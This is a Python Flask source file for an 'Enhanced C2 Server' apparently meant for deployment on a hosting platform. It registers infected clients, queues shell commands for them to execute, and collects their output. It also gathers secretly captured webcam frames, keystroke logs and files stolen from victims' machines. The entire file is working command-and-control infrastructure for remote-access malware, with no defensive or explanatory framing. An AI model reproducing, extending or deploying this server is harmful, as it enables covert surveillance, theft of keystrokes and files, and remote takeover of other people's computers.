#!/usr/bin/env python3
"""
Enhanced C2 Server - Production Ready for Render.com
"""
from flask import Flask, request, jsonify, send_file, Response
from flask_cors import CORS
import sqlite3
import json
import time
import threading
from datetime import datetime
import os
import io
import base64

app = Flask(__name__)
CORS(app)

# Use environment variable for port (Render requirement)
PORT = int(os.environ.get('PORT', 5000))

def init_db():
    conn = sqlite3.connect('c2.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS clients (
        id TEXT PRIMARY KEY, hostname TEXT, username TEXT, os TEXT, ip TEXT,
        first_seen TEXT, last_seen TEXT, status TEXT, info TEXT, 
        camera_available INTEGER, screen_size TEXT)""")
    c.execute("""CREATE TABLE IF NOT EXISTS commands (
        id INTEGER PRIMARY KEY AUTOINCREMENT, client_id TEXT, command TEXT,
        status TEXT, created_at TEXT, executed_at TEXT, output TEXT)""")
    c.execute("""CREATE TABLE IF NOT EXISTS files (
        id INTEGER PRIMARY KEY AUTOINCREMENT, client_id TEXT, filename TEXT,
        content BLOB, uploaded_at TEXT, file_type TEXT)""")
    c.execute("""CREATE TABLE IF NOT EXISTS camera_feeds (
        id INTEGER PRIMARY KEY AUTOINCREMENT, client_id TEXT, 
        frame BLOB, timestamp TEXT)""")
    c.execute("""CREATE TABLE IF NOT EXISTS keystrokes (
        id INTEGER PRIMARY KEY AUTOINCREMENT, client_id TEXT,
        data TEXT, timestamp TEXT)""")
    conn.commit()
    conn.close()

init_db()

@app.route('/')
def index():
    return jsonify({
        'name': 'Enhanced C2 Server',
        'version': '2.0',
        'status': 'running',
        'features': ['camera', 'screen_record', 'keylog', 'clipboard', 'silent_exec']
    })

@app.route('/api/checkin', methods=['POST'])
def checkin():
    data = request.json
    client_id = data.get('id')
    conn = sqlite3.connect('c2.db')
    c = conn.cursor()
    c.execute("SELECT id FROM clients WHERE id=?", (client_id,))
    now = datetime.now().isoformat()
    
    if c.fetchone():
        c.execute("""UPDATE clients SET last_seen=?, status='online', ip=?, 
                     camera_available=?, screen_size=? WHERE id=?""",
                 (now, request.remote_addr, data.get('camera', 0), 
                  data.get('screen_size', ''), client_id))
    else:
        c.execute("""INSERT INTO clients VALUES (?,?,?,?,?,?,?,'online',?,?,?)""",
                 (client_id, data.get('hostname'), data.get('username'), 
                  data.get('os'), request.remote_addr, now, now,
                  json.dumps(data.get('info',{})), data.get('camera', 0),
                  data.get('screen_size', '')))
    conn.commit()
    conn.close()
    return jsonify({'status': 'ok'})

@app.route('/api/commands/<client_id>')
def get_commands(client_id):
    conn = sqlite3.connect('c2.db')
    c = conn.cursor()
    c.execute("SELECT id, command FROM commands WHERE client_id=? AND status='pending'", 
              (client_id,))
    commands = [{'id': r[0], 'command': r[1]} for r in c.fetchall()]
    conn.close()
    return jsonify({'commands': commands})

@app.route('/api/result', methods=['POST'])
def submit_result():
    data = request.json
    conn = sqlite3.connect('c2.db')
    c = conn.cursor()
    c.execute("""UPDATE commands SET status='completed', executed_at=?, output=? 
                 WHERE id=?""",
             (datetime.now().isoformat(), data.get('output'), data.get('command_id')))
    conn.commit()
    conn.close()
    return jsonify({'status': 'ok'})

@app.route('/api/clients')
def list_clients():
    conn = sqlite3.connect('c2.db')
    c = conn.cursor()
    c.execute("""SELECT id,hostname,username,os,ip,first_seen,last_seen,status,
                 camera_available,screen_size FROM clients ORDER BY last_seen DESC""")
    clients = [{'id':r[0],'hostname':r[1],'username':r[2],'os':r[3],'ip':r[4],
                'first_seen':r[5],'last_seen':r[6],'status':r[7],
                'camera':r[8],'screen':r[9]} for r in c.fetchall()]
    conn.close()
    return jsonify({'clients': clients})

@app.route('/api/command', methods=['POST'])
def send_command():
    data = request.json
    conn = sqlite3.connect('c2.db')
    c = conn.cursor()
    c.execute("""INSERT INTO commands (client_id,command,status,created_at) 
                 VALUES (?,?,'pending',?)""",
             (data.get('client_id'), data.get('command'), datetime.now().isoformat()))
    cmd_id = c.lastrowid
    conn.commit()
    conn.close()
    return jsonify({'status': 'ok', 'command_id': cmd_id})

@app.route('/api/camera/frame', methods=['POST'])
def upload_camera_frame():
    """Receive camera frame from client"""
    client_id = request.form.get('client_id')
    frame_data = request.form.get('frame')  # Base64 encoded
    
    conn = sqlite3.connect('c2.db')
    c = conn.cursor()
    c.execute("""INSERT INTO camera_feeds (client_id, frame, timestamp) 
                 VALUES (?, ?, ?)""",
             (client_id, frame_data, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    return jsonify({'status': 'ok'})

@app.route('/api/camera/latest/<client_id>')
def get_latest_frame(client_id):
    """Get latest camera frame"""
    conn = sqlite3.connect('c2.db')
    c = conn.cursor()
    c.execute("""SELECT frame, timestamp FROM camera_feeds 
                 WHERE client_id=? ORDER BY timestamp DESC LIMIT 1""",
             (client_id,))
    result = c.fetchone()
    conn.close()
    
    if result:
        return jsonify({'frame': result[0], 'timestamp': result[1]})
    return jsonify({'error': 'No frames'}), 404

@app.route('/api/keylog', methods=['POST'])
def upload_keylog():
    """Receive keylog data"""
    data = request.json
    conn = sqlite3.connect('c2.db')
    c = conn.cursor()
    c.execute("""INSERT INTO keystrokes (client_id, data, timestamp) 
                 VALUES (?, ?, ?)""",
             (data.get('client_id'), data.get('data'), datetime.now().isoformat()))
    conn.commit()
    conn.close()
    return jsonify({'status': 'ok'})

@app.route('/api/keylog/<client_id>')
def get_keylogs(client_id):
    """Get keylog data"""
    conn = sqlite3.connect('c2.db')
    c = conn.cursor()
    c.execute("""SELECT data, timestamp FROM keystrokes 
                 WHERE client_id=? ORDER BY timestamp DESC LIMIT 100""",
             (client_id,))
    logs = [{'data': r[0], 'timestamp': r[1]} for r in c.fetchall()]
    conn.close()
    return jsonify({'logs': logs})

@app.route('/api/upload', methods=['POST'])
def upload_file():
    client_id = request.form.get('client_id')
    filename = request.form.get('filename')
    file_type = request.form.get('type', 'file')
    file = request.files.get('file')
    
    conn = sqlite3.connect('c2.db')
    c = conn.cursor()
    c.execute("""INSERT INTO files (client_id,filename,content,uploaded_at,file_type) 
                 VALUES (?,?,?,?,?)""",
             (client_id, filename, file.read(), datetime.now().isoformat(), file_type))
    conn.commit()
    conn.close()
    return jsonify({'status': 'ok'})

@app.route('/api/stats')
def stats():
    conn = sqlite3.connect('c2.db')
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM clients")
    total = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM clients WHERE status='online'")
    online = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM clients WHERE camera_available=1")
    with_camera = c.fetchone()[0]
    conn.close()
    return jsonify({
        'total_clients': total,
        'online_clients': online,
        'clients_with_camera': with_camera
    })

@app.route('/api/commands/history/<client_id>')
def history(client_id):
    conn = sqlite3.connect('c2.db')
    c = conn.cursor()
    c.execute("""SELECT id,command,status,created_at,executed_at,output 
                 FROM commands WHERE client_id=? ORDER BY created_at DESC LIMIT 50""",
             (client_id,))
    cmds = [{'id':r[0],'command':r[1],'status':r[2],'created_at':r[3],
             'executed_at':r[4],'output':r[5]} for r in c.fetchall()]
    conn.close()
    return jsonify({'commands': cmds})

def check_offline():
    while True:
        time.sleep(60)
        conn = sqlite3.connect('c2.db')
        c = conn.cursor()
        timeout = datetime.fromtimestamp(time.time() - 300).isoformat()
        c.execute("""UPDATE clients SET status='offline' 
                     WHERE last_seen < ? AND status='online'""", (timeout,))
        conn.commit()
        conn.close()

threading.Thread(target=check_offline, daemon=True).start()

if __name__ == '__main__':
    print("="*70)
    print("ENHANCED C2 SERVER STARTING")
    print("="*70)
    print(f"Port: {PORT}")
    print("="*70)
    app.run(host='0.0.0.0', port=PORT, debug=False)
